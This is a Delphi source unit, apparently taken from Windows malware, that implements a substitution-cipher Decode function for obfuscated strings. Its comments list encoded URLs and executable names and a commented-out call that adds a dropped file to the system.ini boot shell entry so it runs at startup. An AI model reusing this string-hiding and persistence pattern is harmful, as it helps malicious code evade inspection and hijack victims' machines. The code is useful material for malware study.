unit Unit1;

interface

uses windows;

var
 ABC1, ABC2       : STRING;

 A : Array[0..63] of integer = (97, 98, 99, 100, 101, 102, 103, 104, 105, 106,
                                107, 108, 109, 110, 111, 112, 113, 114, 115, 116,
                                117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69,
                                70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81,
                                82, 83, 84, 85, 86, 87, 88, 89, 90, 48, 49, 50,
                                51, 52, 53, 54, 55, 56, 57, 32, 124);

 B : Array[0..63] of integer = (87, 121, 97, 79, 113, 53, 72, 106, 89, 65, 99, 81,
                                115, 55, 74, 108, 48, 66, 101, 83, 117, 57, 75,
                                109, 49, 68, 102, 86, 119, 124, 77, 111, 51, 70,
                                104, 85, 120, 98, 80, 114, 54, 71, 107, 90, 67,
                                100, 82, 116, 56, 76, 110, 50, 69, 103, 84, 118,
                                32, 73, 112, 52, 122, 105, 88, 78);

//  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 |
//  WyaOq5HjYAcQs7Jl0BeSu9Km1DfVw|Mo3FhUxbPr6GkZCdRt8Ln2EgTv Ip4ziXN
//  jSSl://KKK.Qu7WBeSJBs.aJs
//  jSSl://KKK.sYaBJe5S.aJs
//  PJ7cq1QJ9q = Monkeylove |bR
//  .raw  =
//
// \KY732ojm.qmq   \win32Fhx.exe
// yJJS            boot
// ejqQQ           shell
// MmlQJBqB.qmq    Explorer.exe
// e1eSqs.Y7Y
//
// writeprivateprofilestring('boot','shell',
// pchar('Explorer.exe '+Driv),
// 'system.ini');

function Decode(str:string):string;

implementation

function Decode(str:string):string;
var
h,i,j:integer;
ch:string;
c:boolean;
begin

ABC1 := '';
ABC2 := '';

For H := 0 To 63 Do
 ABC1 := ABC1 + Chr(A[h]);
For H := 0 To 63 Do
 ABC2 := ABC2 + Chr(B[h]);


result:='';
for i:=1 to length(str) do begin
 ch := copy(str,i,1);
 c:=false;
 for j:=1 to length(ABC2) do begin
  if copy(ABC2,j,1)=ch then begin
   result:=result+copy(ABC1,j,1);
   c := true;
  end;
 end;
  if not c then result := result + ch;
end;
end;

end.
